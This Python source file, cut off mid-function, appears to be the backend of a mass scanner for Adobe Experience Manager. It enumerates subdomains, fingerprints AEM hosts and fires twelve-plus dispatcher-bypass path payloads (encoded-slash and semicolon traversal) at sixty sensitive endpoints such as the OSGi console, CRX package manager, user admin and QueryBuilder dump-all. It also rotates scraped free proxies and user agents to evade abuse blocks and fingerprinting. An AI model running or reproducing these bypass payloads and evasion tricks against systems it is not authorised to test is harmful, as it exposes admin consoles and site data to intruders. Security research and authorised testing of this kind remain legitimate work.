#!/usr/bin/env python3
"""
AEM Dispatcher Bypass Scanner — FastAPI Web Backend
====================================================
Real-time WebSocket-driven scanner with 4-phase pipeline:
  1. Subdomain Enumeration (subfinder)
  2. Alive Host Check (ProjectDiscovery httpx)
  3. AEM Detection (multi-signal fingerprinting)
  4. Dispatcher Bypass Scan (12+1 bypass techniques, 60 endpoints)

API:
  POST /api/scan                — start a scan
  GET  /api/scan/{id}/status    — poll scan status
  WS   /ws/{id}                 — real-time updates
  GET  /api/scan/{id}/results   — final results
  GET  /                        — serve frontend HTML

ref: SL Cyber / infosec_au / Muhammad Waseem research
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import socket
import string
import subprocess
import sys
import threading
import time
import uuid
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import requests
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, UploadFile, File
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("aem-scanner")

# ============================================================================
# DEFAULTS
# ============================================================================
DEFAULT_THREADS = 100
DEFAULT_PER_HOST = 10
DEFAULT_TIMEOUT = 12
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
HEADERS = {"User-Agent": DEFAULT_UA, "Accept": "*/*"}

# ============================================================================
# C99 CONFIG — read from environment
# ============================================================================
# Set C99_API_KEY to use the official C99 API (no scraping, no blocks)
# Get your key at https://api.c99.nl for $5
C99_API_KEY: str = os.environ.get("C99_API_KEY", "").strip()

# Optional: comma-separated list of proxies for C99 scraping fallback
# Format: http://ip:port,socks5://user:pass@ip:port,http://ip:port
# If not set, the scanner auto-fetches fresh free proxies on first abuse block
_raw_proxy_list = os.environ.get("C99_PROXIES", os.environ.get("PROXY_LIST", "")).strip()
C99_PROXY_LIST: list[str] = [p.strip() for p in _raw_proxy_list.split(",") if p.strip()] if _raw_proxy_list else []
_c99_proxy_index = 0
_c99_proxy_lock = threading.Lock()

# Sources that supply fresh free proxy lists (plain ip:port per line)
_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
]
_proxy_fetch_lock = threading.Lock()
_proxy_last_fetched: float = 0.0   # epoch seconds of last auto-fetch
MY_PUBLIC_IP: str = ""             # populated at startup for dedup

def _get_my_ip() -> str:
    """Return the server's own public IP (cached)."""
    global MY_PUBLIC_IP
    if MY_PUBLIC_IP:
        return MY_PUBLIC_IP
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=6)
        MY_PUBLIC_IP = r.json().get("ip", "")
        log.info("Public IP: %s", MY_PUBLIC_IP)
    except Exception:
        pass
    return MY_PUBLIC_IP

def _test_proxy(proxy_str: str, my_ip: str) -> bool:
    """Return True if proxy works and exposes a different IP."""
    try:
        r = requests.get(
            "https://api.ipify.org?format=json",
            proxies={"http": proxy_str, "https": proxy_str},
            timeout=6,
        )
        if r.status_code == 200:
            returned_ip = r.json().get("ip", "")
            return bool(returned_ip) and returned_ip != my_ip
    except Exception:
        pass
    return False

def fetch_fresh_proxies(min_working: int = 10, status_cb=None) -> list[str]:
    """
    Download free proxy lists, test them in parallel, return working ones.
    status_cb(msg): optional callback for progress messages (shown in WS feed).
    """
    global _proxy_last_fetched
    my_ip = _get_my_ip()
    raw: list[str] = []

    if status_cb:
        status_cb(f"Fetching fresh free proxies from {len(_PROXY_SOURCES)} sources...")
    log.info("Fetching fresh proxy lists")

    for src in _PROXY_SOURCES:
        try:
            resp = requests.get(src, timeout=12, headers={"User-Agent": "curl/7.88"})
            if resp.status_code == 200:
                for line in resp.text.strip().splitlines():
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        # strip any scheme already present
                        line = line.replace("http://", "").replace("https://", "").split()[0]
                        raw.append("http://" + line)
        except Exception as e:
            log.debug("Proxy source error %s: %s", src, e)

    raw = list(dict.fromkeys(raw))  # deduplicate preserving order
    log.info("Collected %d raw proxy candidates", len(raw))
    if status_cb:
        status_cb(f"Testing {len(raw)} proxy candidates (parallel)...")

    working: list[str] = []
    wlock = threading.Lock()

    def _test(p: str) -> None:
        if _test_proxy(p, my_ip):
            with wlock:
                working.append(p)

    with ThreadPoolExecutor(max_workers=40) as pool:
        futs = [pool.submit(_test, p) for p in raw[:300]]  # cap at 300 candidates
        for _ in as_completed(futs):
            with wlock:
                if len(working) >= min_working * 2:
                    break  # we have enough — no need to wait for all

    _proxy_last_fetched = time.time()
    log.info("fetch_fresh_proxies: %d working out of %d tested", len(working), len(raw))
    if status_cb:
        status_cb(f"Proxy refresh done: {len(working)} working proxies found")
    return working[:min_working * 2]  # return up to 2× the minimum

def _ensure_proxies(status_cb=None) -> None:
    """
    If C99_PROXY_LIST is empty (or stale >1h), auto-fetch fresh proxies and
    populate the list so subsequent C99 requests rotate through them.
    """
    global C99_PROXY_LIST, _proxy_last_fetched
    with _c99_proxy_lock:
        age = time.time() - _proxy_last_fetched
        if C99_PROXY_LIST and age < 3600:
            return  # list is fresh enough
    fresh = fetch_fresh_proxies(min_working=8, status_cb=status_cb)
    with _c99_proxy_lock:
        if fresh:
            C99_PROXY_LIST = fresh
            log.info("Auto-populated %d fresh proxies", len(fresh))

def _add_proxy(proxy_str: str) -> None:
    """Append a new proxy to the rotation pool at runtime."""
    with _c99_proxy_lock:
        if proxy_str not in C99_PROXY_LIST:
            C99_PROXY_LIST.append(proxy_str)

def _remove_proxy(proxy_str: str) -> None:
    """Remove a dead/blocked proxy from the rotation pool."""
    with _c99_proxy_lock:
        try:
            C99_PROXY_LIST.remove(proxy_str)
        except ValueError:
            pass

def _next_c99_proxy() -> dict | None:
    """Return next proxy dict from rotation, or None if no proxies configured."""
    global _c99_proxy_index
    with _c99_proxy_lock:
        if not C99_PROXY_LIST:
            return None
        proxy = C99_PROXY_LIST[_c99_proxy_index % len(C99_PROXY_LIST)]
        _c99_proxy_index += 1
    return {"http": proxy, "https": proxy}

def _current_proxy_str() -> str | None:
    """Return the proxy string that was last handed out (for removal on block)."""
    with _c99_proxy_lock:
        if not C99_PROXY_LIST:
            return None
        idx = (_c99_proxy_index - 1) % len(C99_PROXY_LIST)
        return C99_PROXY_LIST[idx]

# User-Agent pool for C99 scraping fallback (rotate to avoid fingerprinting)
_C99_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
]
_c99_ua_index = 0
_c99_ua_lock = threading.Lock()

def _next_c99_ua() -> str:
    global _c99_ua_index
    with _c99_ua_lock:
        ua = _C99_UA_POOL[_c99_ua_index % len(_C99_UA_POOL)]
        _c99_ua_index += 1
    return ua

# Fetch and cache our own IP at startup (background — don't block startup)
threading.Thread(target=_get_my_ip, daemon=True).start()

# ============================================================================
# INTERNET CONNECTIVITY MONITOR
# ============================================================================
# Global flag + background thread.  All phases check this before making
# outbound requests; if False they call _wait_for_internet() which blocks
# (releasing the GIL) until connectivity returns, then resumes the scan
# exactly where it left off.
# ---------------------------------------------------------------------------
_internet_up: bool = True
_internet_lock = threading.Lock()

_CONNECTIVITY_PROBES = [
    ("8.8.8.8",   53),   # Google DNS  — no DNS resolution needed
    ("1.1.1.1",   53),   # Cloudflare DNS
    ("8.8.4.4",   53),   # Google DNS alt
]
_INTERNET_CHECK_INTERVAL_UP   = 10   # seconds between checks when online
_INTERNET_CHECK_INTERVAL_DOWN = 30   # seconds between checks when offline

def _check_internet_once() -> bool:
    """Try TCP to well-known DNS servers.  Returns True if any succeeds."""
    for host, port in _CONNECTIVITY_PROBES:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.close()
            return True
        except (socket.error, OSError):
            pass
    return False

def _internet_monitor_loop() -> None:
    """Background daemon: keeps _internet_up in sync with real connectivity."""
    global _internet_up
    while True:
        up = _check_internet_once()
        with _internet_lock:
            changed = (up != _internet_up)
            _internet_up = up
        if changed:
            log.info("Internet connectivity changed → %s", "UP ✓" if up else "DOWN ✗")
        time.sleep(_INTERNET_CHECK_INTERVAL_UP if up else _INTERNET_CHECK_INTERVAL_DOWN)

# Start monitor thread once at import time
threading.Thread(
    target=_internet_monitor_loop, daemon=True, name="internet-monitor"
).start()


def _wait_for_internet(scan: ScanState, context: str = "") -> bool:
    """
    Block the calling thread until internet connectivity is restored.

    Returns:
        True  — internet is (now) available; caller may proceed
        False — scan was cancelled while waiting; caller should abort

    Side-effects:
        • Sets scan.status = "paused" while waiting
        • Sends ``internet_pause`` / ``internet_resume`` WS events
        • Persists the scan so the UI shows the paused state on refresh
    """
    global _internet_up

    # Fast path — most of the time we're online
    if _internet_up:
        return True

    ctx_msg = f" — {context}" if context else ""
    log.info("Internet down; scan %s pausing%s", scan.scan_id, ctx_msg)

    prev_status = scan.status
    scan.status = "paused"
    _persist_scan(scan)

    _send_ws(scan, {
        "type":    "internet_pause",
        "message": (
            f"⏸ Internet lost{ctx_msg}. "
            f"Scan paused — will auto-resume when connection returns "
            f"(checking every {_INTERNET_CHECK_INTERVAL_DOWN}s)."
        ),
        "context": context,
    })

    # Poll until back online or cancelled
    waited = 0
    while not _internet_up:
        # Inner 1-second tick loop so we react to cancel quickly
        for _ in range(_INTERNET_CHECK_INTERVAL_DOWN):
            if scan.cancelled:
                scan.status = "cancelled"
                _persist_scan(scan)
                return False
            time.sleep(1)
            waited += 1
        # Re-probe directly in case the monitor thread lags
        if _check_internet_once():
            with _internet_lock:
                _internet_up = True

    # Internet restored
    scan.status = prev_status if prev_status not in ("paused",) else "running"
    log.info(
        "Internet restored after ~%ds; scan %s resuming%s",
        waited, scan.scan_id, ctx_msg,
    )

    _send_ws(scan, {
        "type":    "internet_resume",
        "message": (
            f"▶ Internet restored — resuming{ctx_msg} "
            f"(was offline ~{waited}s)."
        ),
        "context": context,
        "waited_seconds": waited,
    })
    return True


# ============================================================================
# AEM ENDPOINTS (60 targets)
# ============================================================================
AEM_ENDPOINTS: list[tuple[str, str]] = [
    # QueryBuilder / Search
    ("bin/querybuilder.json", "QueryBuilder JSON"),
    ("bin/querybuilder.json?type=f:NT_BASE&p.limit=-1", "QueryBuilder Dump All"),
    ("bin/querybuilder.json.servlet", "QueryBuilder Servlet"),
    ("bin/querybuilder.feed.servlet", "QueryBuilder Feed"),
    ("bin/wcm/search/gql.servlet.json", "GQL Search"),
    ("bin/gql/endpoints.json", "GQL Endpoints"),
    # CRX / Package Manager
    ("crx/packmgr/service.jsp", "CRX PackMgr Service"),
    ("crx/packmgr/service.jsp?cmd=ls", "CRX PackMgr List Pkgs"),
    ("crx/packmgr/index.jsp", "CRX PackMgr UI"),
    ("crx/de/index.jsp", "CRXDE Lite"),
    ("crx/de/service.jsp", "CRXDE Service"),
    ("crx/explorer/browser/index.jsp", "CRX Browser"),
    ("crx/server/crx.default/jcr:root/.1.json", "JCR Root JSON"),
    # OSGi / System Console
    ("system/console", "OSGi Console"),
    ("system/console/bundles.json", "OSGi Bundles JSON"),
    ("system/console/configMgr", "OSGi ConfigMgr"),
    ("system/console/jmx", "JMX Console"),
    ("system/console/status-productinfo.txt", "Product Info"),
    ("system/console/users", "OSGi Users"),
    ("system/console/licenses", "OSGi Licenses"),
    ("system/health", "Health Check"),
    # Content / JCR
    ("content.json", "Content Root JSON"),
    ("content.infinity.json", "Content Infinity JSON"),
    ("content..4.json", "Content Depth-4 JSON"),
    ("content/dam.json", "DAM Root JSON"),
    ("content/dam.1.json", "DAM Depth-1 JSON"),
    ("content/dam.infinity.json", "DAM Infinity JSON"),
    ("content/usergenerated.json", "User Generated Content"),
    ("content/usergenerated/content.json", "User Generated Content JSON"),
    # Admin / UI Panels
    ("libs/granite/security/content/useradmin.html", "User Admin"),
    ("libs/granite/security/content/admin.html", "Granite Admin"),
    ("libs/granite/core/content/login.html", "Granite Login"),
    ("libs/cq/search/content/querydebug.html", "Query Debug"),
    ("libs/granite/omnisearch/content.html", "OmniSearch"),
    ("libs/wcm/core/content/siteadmin.html", "Site Admin"),
    ("libs/cq/core/content/welcome.html", "CQ Welcome"),
    ("libs/dam/gui/content/assets.html", "DAM Assets UI"),
    ("libs/cq/gui/content/dumplibs.html", "ClientLibs Dump"),
    ("libs/cq/tagging/gui/content/tagging.html", "Tag Manager"),
    ("libs/cq/workflow/content/console.html", "Workflow Console"),
    # Config / Replication
    ("etc/packages.json", "Packages JSON"),
    ("etc/reports/diskusage.html", "Disk Usage"),
    ("etc/replication/agents.author.html", "Replication Author"),
    ("etc/replication/agents.publish.html", "Replication Publish"),
    ("etc/replication.html", "Replication Page"),
    ("etc/cloudservices.html", "Cloud Services"),
    ("etc/designs.json", "Designs JSON"),
    # CSRF / Token Leaks
    ("libs/granite/csrf/token.json", "CSRF Token Leak"),
    # Trust Store / Security
    ("libs/granite/security/truststore.json", "Trust Store JSON"),
    ("libs/cq/security/userinfo.json", "User Info JSON"),
    # Feeds / Sling
    ("bin/feed.json", "Sling Feed JSON"),
    # Misc
    ("admin", "AEM Admin"),
    ("start", "AEM Start"),
    ("mnt/overlay/content", "Overlay Content"),
    ("apps.json", "Apps JSON"),
    ("var/classes.json", "Var Classes JSON"),
    ("bin/wcm/domainmanager", "Domain Manager"),
    ("bin/acs-commons/audit-log-search.html", "ACS Audit Log"),
]

# ============================================================================
# AEM BODY SIGNATURES (for genuine-response validation during bypass scan)
# ============================================================================
AEM_SIGNATURES: dict[str, list[str]] = {
    "QueryBuilder JSON": ['"hits"', '"success"', '"querybuilder"', '"results"'],
    "QueryBuilder Servlet": ['"hits"', '"success"', '"results"'],
    "QueryBuilder Feed": ["<feed", "<entry", "querybuilder"],
    "GQL Search": ['"hits"', '"results"', "gql"],
    "GQL Endpoints": ['"graphql"', '"endpoints"', '"name"', '"path"'],
    "CRX PackMgr Service": ["<crx:", "<packages", "packmgr", "crx/packmgr"],
    "CRX PackMgr List Pkgs": ["<crx:", "<packages", "<package"],
    "CRX PackMgr UI": ["CRX Package Manager", "crx/packmgr", "packagemgr"],
    "CRXDE Lite": ["CRXDE Lite", "crxde", "CRX DE"],
    "CRX Browser": ["CRX", "crx/explorer", "Repository Browser"],
    "JCR Root JSON": ['"jcr:primaryType"', '"rep:root"'],
    "OSGi Console": ["Apache Felix", "OSGi Framework", "felix"],
    "OSGi Bundles JSON": ['"symbolic-name"', '"Bundle-SymbolicName"', '"state"'],
    "OSGi ConfigMgr": ["Configuration Admin", "felix.cm", "configMgr", "OSGi"],
    "JMX Console": ["MBeanServer", "JMX", "Jolokia", "MBean"],
    "Product Info": ["Adobe Experience Manager", "CQ Version", "AEM"],
    "Health Check": ['"status"', '"checks"', "health"],
    "Content Root JSON": ['"jcr:primaryType"', '"cq:Page"', '"rep:root"'],
    "Content Infinity JSON": ['"jcr:primaryType"', '"jcr:content"'],
    "Content Depth-4 JSON": ['"jcr:primaryType"'],
    "DAM Root JSON": ['"jcr:primaryType"', '"dam:'],
    "DAM Depth-1 JSON": ['"jcr:primaryType"', '"dam:'],
    "DAM Infinity JSON": ['"jcr:primaryType"', '"dam:'],
    "User Generated Content": ['"jcr:primaryType"', "usergenerated"],
    "User Admin": ["User Administration", "useradmin", "Granite Security"],
    "Granite Admin": ["Granite Security", "useradmin"],
    "Granite Login": ["j_username", "j_password", "granite.login"],
    "Query Debug": ["Query Debug", "querydebug", "querybuilder"],
    "OmniSearch": ["omnisearch", "OmniSearch"],
    "Site Admin": ["Sites Admin", "siteadmin", "wcm/core"],
    "CQ Welcome": ["Adobe CQ", "Experience Manager", "CQ Welcome"],
    "DAM Assets UI": ["Digital Asset", "dam/gui", "Assets"],
    "ClientLibs Dump": ["clientlibs", "dumplibs", "categories"],
    "CSRF Token Leak": ['"token"', "granite.csrf", "CSRF"],
    "Packages JSON": ['"packages"', '"name"', '"version"', '"group"'],
    "Disk Usage": ["Disk Usage", "diskusage", "repository"],
    "Replication Author": ["Replication Agent", "transportUri", "author"],
    "Replication Publish": ["Replication Agent", "transportUri", "publish"],
    "Replication Page": ["Replication", "agents", "replication"],
    "Cloud Services": ["Cloud Services", "cloudservices"],
    "Overlay Content": ['"jcr:primaryType"', "overlay"],
    "Apps JSON": ['"jcr:primaryType"', '"sling:Folder"'],
    "Var Classes JSON": ['"jcr:primaryType"', "var/classes"],
    "Domain Manager": ["DomainManager", "domain manager"],
    "AEM Admin": ["Adobe Experience Manager", "Welcome to AEM"],
    "AEM Start": ["Adobe Experience Manager", "AEM"],
    # New endpoints
    "QueryBuilder Dump All": ['"hits"', '"success"', '"results"', '"jcr:primaryType"'],
    "CRXDE Service": ["crx:", "jcr:", "crxde", "service.jsp"],
    "OSGi Users": ["users", "principal", "admin", "apache"],
    "OSGi Licenses": ["license", "Apache", "felix"],
    "User Generated Content JSON": ['"jcr:primaryType"', "usergenerated"],
    "Tag Manager": ["tagging", "cq:Tag", "tagmanager"],
    "Workflow Console": ["workflow", "Workflow", "models"],
    "Designs JSON": ['"jcr:primaryType"', '"designs"', '"cq:Page"'],
    "Trust Store JSON": ['"truststore"', '"aliases"', '"subject"'],
    "User Info JSON": ['"userId"', '"name"', '"home"', '"path"'],
    "Sling Feed JSON": ['"feed"', '"entries"', '"sling"'],
    "ACS Audit Log": ["audit", "ACS", "acs-commons"],
}

# ============================================================================
# AEM DETECTION — paths, headers, body sigs
# ============================================================================
AEM_DETECT_PATHS: list[tuple[str, str]] = [
    ("/libs/granite/core/content/login.html", "libs-login"),
    ("/content.json", "content-json"),
    ("/system/console", "osgi-console"),
    ("/crx/de/index.jsp", "crxde"),
    ("/bin/querybuilder.json", "querybuilder"),
    ("/content/dam.json", "dam-json"),
    ("/content/dam.ext.json", "dam-ext-json"),
    ("/content/dam.childrenlist.json", "dam-childrenlist"),
    ("/apps.json", "apps-json"),
    ("/etc.json", "etc-json"),
    ("/content/dam/www.json", "dam-www-json"),
]

AEM_DETECT_HEADERS: set[str] = {
    "x-dispatcher",
    "x-vhost",
    "x-aem-request-id",
    "x-aem-debug",
    "x-aem-uuid",
    "dispatcher",
}

AEM_BODY_SIGS_DETECT: list[str] = [
    "jcr:primaryType",
    "sling:resourceType",
    "cq:Page",
    "adobe experience manager",
    "j_username",
    "crxde lite",
    "apache felix",
    "cq.wcm.",
    '"dam:',
    "/etc.clientlibs/",
    "granite.ui.",
    "aem-clientlib",
]

# Source-code / HTML analysis patterns for Method A
HTML_ANALYSIS_PATTERNS: list[tuple[str, str]] = [
    # Strict AEM-specific patterns — avoid generic matches
    # /content/dam/ or /content/<project>/ with AEM path style (not just "/content/" anywhere)
    (r'(?:href|src|action)=["\'][^"\']*?/content/(?:dam|cq|we-retail|geometrixx|experience-fragments|campaigns|communities|screens|forms|projects|launches|catalogs)', "html:/content/ path"),
    (r'/etc\.clientlibs/', "html:/etc.clientlibs/ ref"),
    # jcr: must appear as an XML/HTML attribute (namespace:property), not in URLs or text
    (r'(?:jcr:primaryType|jcr:content|jcr:title|jcr:description|jcr:created|jcr:lastModified|jcr:uuid)', "html:jcr: attribute"),
    (r'class=["\'][^"\']*parsys', "html:parsys class"),
    # cq- must be in a CSS class attribute, not in URLs (avoids s_cid=acq- false positives)
    (r'class=["\'][^"\']*\bcq-', "html:cq- prefix class"),
]

# JavaScript console object patterns for Method E
JS_OBJECT_PATTERNS: list[tuple[str, str]] = [
    (r'CQ\.WCM', "js:CQ.WCM"),
    (r'CQ\.\w+', "js:CQ namespace"),
    (r'Sling\.servlet', "js:Sling.servlet"),
    (r'granite\.ui', "js:granite.ui"),
    (r'Granite\.', "js:Granite namespace"),
]

# Sample content paths for Method F
SAMPLE_CONTENT_PATHS: list[tuple[str, str]] = [
    ("/content/geometrixx/en.html", "sample:geometrixx"),
    ("/content/we-retail/us/en.html", "sample:we-retail-html"),
    ("/content/we-retail/us/en.json", "sample:we-retail-json"),
]

# ============================================================================
# WAF REJECTION SIGNATURES
# ============================================================================
WAF_REJECT_SIGS: list[str] = [
    "request rejected",
    "your support id is",
    "incapsula incident",
    "request unsuccessful. incap",
    "you have been blocked",
    "access to this resource on the server is denied",
    "this request has been blocked",
    "blocked by security policy",
    "web application firewall",
    "cloudflare ray id",
    "attention required! | cloudflare",
    "error 1006",
    "error 1010",
    "error 1015",
    "the requested url was rejected",
]

SOFT404_PROBES: list[str] = [
    "/aem-scan-probe-xyz123-notexist.json",
    "/probe-nonexistent-aem-abc987-check.html",
]

# ============================================================================
# BYPASS TECHNIQUES
# ============================================================================
BYPASS_TAGS: list[str] = [
    "nocanon",
    "nocanon-upper",
    "nocanon-2slash",
    "nocanon-2slash-up",
    "path-param",
    "hybrid",
    "dynmedia",
    "nocanon-3dot",
    "double-slash",
    "encoded-slash",
    "semi-traverse",
    "suffix-bypass",
]


def build_bypass_paths(ep_path: str) -> list[tuple[str, str]]:
    """Build all 12 bypass URL variants for a given endpoint path."""
    if "?" in ep_path:
        base, qs = ep_path.split("?", 1)
        qs = "?" + qs
    else:
        base, qs = ep_path, ""

    return [
        # Technique 1-4: AllowEncodedSlashes / nocanon traversal
        ("nocanon",          f"/graphql/execute.json/..%2f../{base}{qs}"),
        ("nocanon-upper",    f"/graphql/execute.json/..%2F../{base}{qs}"),
        ("nocanon-2slash",   f"//graphql/execute.json/..%2f../{base}{qs}"),
        ("nocanon-2slash-up",f"//graphql/execute.json/..%2F../{base}{qs}"),
        # Technique 5-6: Semicolon path-parameter injection
        ("path-param",       f"/{base};a.css{qs}"),
        ("hybrid",           f"/{base};x=graphql/execute.json{qs}"),
        # Technique 7: DynamicMedia path traversal
        ("dynmedia",         f"/adobe/dynamicmedia/deliver/..;/..;/..;/{base}{qs}"),
        # Technique 8: Triple-dot encoded traversal
        ("nocanon-3dot",     f"/graphql/execute.json/..%2f..%2f..%2f{base}{qs}"),
        # Technique 9: Double-slash direct (dispatcher rule bypass)
        ("double-slash",     f"//{base}{qs}"),
        # Technique 10: URL-encoded slash prefix
        ("encoded-slash",    f"/%2f{base}{qs}"),
        # Technique 11: Semicolon traversal via content path
        ("semi-traverse",    f"/content/..;/{base}{qs}"),
        # Technique 12: Suffix/selector bypass via .html/suffix
        ("suffix-bypass",    f"/{base}.css/a.html{qs}" if not qs else f"/{base}.css{qs}"),
    ]


def build_ext_json_path(ep_path: str) -> tuple[str, str] | None:
    """Build the .ext.json selector bypass variant (technique #13)."""
    if "?" in ep_path:
        base, qs = ep_path.split("?", 1)
        qs = "?" + qs
    else:
        base, qs = ep_path, ""
    # Applicable to paths with extensions that can be rewritten
    if base.endswith(".json") or base.endswith(".html") or base.endswith(".jsp"):
        root = base.rsplit(".", 1)[0]
        return ("ext-json", f"/{root}.ext.json{qs}")
    return None


# ============================================================================
# SCAN STATE
# ============================================================================
class ScanPhase(str, Enum):
    SUBDOMAIN = "subdomain_enumeration"
    ALIVE = "alive_check"
    AEM_DETECT = "aem_detection"
    BYPASS = "bypass_scan"
    COMPLETE = "complete"
    ERROR = "error"


@dataclass
class ScanState:
    scan_id: str
    domain: str | None = None
    urls: list[str] = field(default_factory=list)
    phase: ScanPhase = ScanPhase.SUBDOMAIN
    status: str = "pending"
    started_at: float = 0.0
    finished_at: float = 0.0

    # Phase 1 results
    subdomains: list[str] = field(default_factory=list)
    # Phase 2 results
    alive_hosts: list[str] = field(default_factory=list)
    # Phase 3 results
    aem_hosts: dict[str, dict[str, Any]] = field(default_factory=dict)
    # Phase 3 — Next.js fingerprinting (runs in parallel with AEM detection)
    nextjs_hosts: dict[str, dict[str, Any]] = field(default_factory=dict)
    # Phase 4 results
    vulnerabilities: list[dict[str, Any]] = field(default_factory=list)
    vulnerability_summary: dict[str, Any] = field(default_factory=dict)

    # Settings
    threads: int = DEFAULT_THREADS
    per_host: int = DEFAULT_PER_HOST
    timeout: int = DEFAULT_TIMEOUT
    bypass_mode: str = "full"

    # WebSocket connections
    ws_connections: list[WebSocket] = field(default_factory=list)
    ws_lock: threading.Lock = field(default_factory=threading.Lock)

    # Cancel flag
    cancelled: bool = False

    # Internet-pause state
    paused_reason: str = ""       # e.g. "internet_down"
    paused_at: float = 0.0        # epoch when paused

    # Resume cursors — how many items each phase has fully processed.
    # Saved to disk on graceful shutdown so a restart can pick up mid-phase.
    phase2_cursor: int = 0   # subdomains sent to httpx
    phase3_cursor: int = 0   # alive hosts probed for AEM (tracked via aem_hosts keys)
    # phase4 deduplication is driven by scan.vulnerabilities — no separate cursor needed

    # Message queue for async delivery
    _msg_queue: asyncio.Queue | None = None
    _loop: asyncio.AbstractEventLoop | None = None

    # Log history for late WebSocket connections
    _log_history: list[dict[str, Any]] = field(default_factory=list)
    _log_history_lock: threading.Lock = field(default_factory=threading.Lock)


# Global scan registry
scans: dict[str, ScanState] = {}
scans_lock = threading.Lock()

# ── Uploaded host list store ──────────────────────────────────────────────────
# upload_id -> {"hosts": [...], "filename": str, "count": int, "created_at": float}
_uploads: dict[str, dict] = {}
_uploads_lock = threading.Lock()

# ============================================================================
# PERSISTENCE — save scans to disk so they survive server restarts
# ============================================================================
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scans_db.json")
_db_lock = threading.Lock()


def _scan_to_dict(scan: ScanState) -> dict[str, Any]:
    """Serialise a ScanState to a plain dict (only JSON-safe fields)."""
    return {
        "scan_id":              scan.scan_id,
        "domain":               scan.domain,
        "urls":                 scan.urls,
        "phase":                scan.phase.value,
        "status":               scan.status,
        "started_at":           scan.started_at,
        "finished_at":          scan.finished_at,
        "subdomains":           scan.subdomains,
        "alive_hosts":          scan.alive_hosts,
        "aem_hosts":            scan.aem_hosts,
        "nextjs_hosts":         scan.nextjs_hosts,
        "vulnerabilities":      scan.vulnerabilities,
        "vulnerability_summary":scan.vulnerability_summary,
        "threads":              scan.threads,
        "per_host":             scan.per_host,
        "timeout":              scan.timeout,
        "bypass_mode":          scan.bypass_mode,
        "paused_reason":        scan.paused_reason,
        "paused_at":            scan.paused_at,
        "phase2_cursor":        scan.phase2_cursor,
        "phase3_cursor":        scan.phase3_cursor,
    }


def _dict_to_scan(d: dict[str, Any]) -> ScanState:
    """Reconstruct a ScanState from a persisted dict (read-only, no live threads)."""
    scan = ScanState(scan_id=d["scan_id"])
    scan.domain              = d.get("domain")
    scan.urls                = d.get("urls", [])
    scan.phase               = ScanPhase(d.get("phase", ScanPhase.SUBDOMAIN.value))
    scan.status              = d.get("status", "complete")
    scan.started_at          = d.get("started_at", 0.0)
    scan.finished_at         = d.get("finished_at", 0.0)
    scan.subdomains          = d.get("subdomains", [])
    scan.alive_hosts         = d.get("alive_hosts", [])
    scan.aem_hosts           = d.get("aem_hosts", {})
    scan.nextjs_hosts        = d.get("nextjs_hosts", {})
    scan.vulnerabilities     = d.get("vulnerabilities", [])
    scan.vulnerability_summary = d.get("vulnerability_summary", {})
    scan.threads             = d.get("threads", DEFAULT_THREADS)
    scan.per_host            = d.get("per_host", DEFAULT_PER_HOST)
    scan.timeout             = d.get("timeout", DEFAULT_TIMEOUT)
    scan.bypass_mode         = d.get("bypass_mode", "full")
    scan.paused_reason       = d.get("paused_reason", "")
    scan.paused_at           = d.get("paused_at", 0.0)
    scan.phase2_cursor       = d.get("phase2_cursor", 0)
    scan.phase3_cursor       = d.get("phase3_cursor", 0)
    return scan


def _persist_scan(scan: ScanState) -> None:
    """Write/update this scan in the on-disk DB (thread-safe)."""
    with _db_lock:
        try:
            # Load existing DB
            if os.path.exists(DB_PATH):
                with open(DB_PATH, "r") as f:
                    db: dict[str, Any] = json.load(f)
            else:
                db = {}
            db[scan.scan_id] = _scan_to_dict(scan)
            # Write atomically via temp file
            tmp = DB_PATH + ".tmp"
            with open(tmp, "w") as f:
                json.dump(db, f, separators=(",", ":"))
            os.replace(tmp, DB_PATH)
        except Exception as e:
            log.warning("Failed to persist scan %s: %s", scan.scan_id, e)


def _delete_persisted_scan(scan_id: str) -> None:
    """Remove a scan from the on-disk DB."""
    with _db_lock:
        try:
            if not os.path.exists(DB_PATH):
                return
            with open(DB_PATH, "r") as f:
                db: dict[str, Any] = json.load(f)
